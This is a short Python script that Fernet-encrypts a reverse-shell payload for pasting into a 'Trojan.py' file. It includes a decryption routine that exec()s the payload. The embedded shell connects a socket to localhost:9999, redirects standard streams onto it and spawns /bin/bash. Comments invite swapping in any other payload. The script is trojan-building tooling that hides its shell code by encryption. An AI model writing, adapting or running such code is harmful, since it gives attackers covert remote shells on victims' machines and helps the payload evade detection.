#For encryption
from cryptography.fernet import Fernet; import socket, os, pty
key = "YvCywvNXO77t1f54rdV7-kBq4wHKEBGLy6mPoLlhZas="
cipher_suite = Fernet(key)

#Creating the encrypted payload
def encrypted_payload_creator():
    #Change the payload_to_be_encrypted to the payload you want (Currently its a reverse shell to localhost)
    payload_to_be_encrypted = 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("localhost",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    encrypted_payload = cipher_suite.encrypt(payload_to_be_encrypted)
    return encrypted_payload
    
#The payload you need
payload = encrypted_payload_creator()
print("Use this payload in the Trojan.py: \n")
print(payload) 

#For testing if the payload works
def decryption_engine(code):
    encrypted_payload = code
    decrypted_payload = cipher_suite.decrypt(encrypted_payload)
    exec(decrypted_payload)

#Uncomment this to check if the payload works
#decryption_engine(payload)
















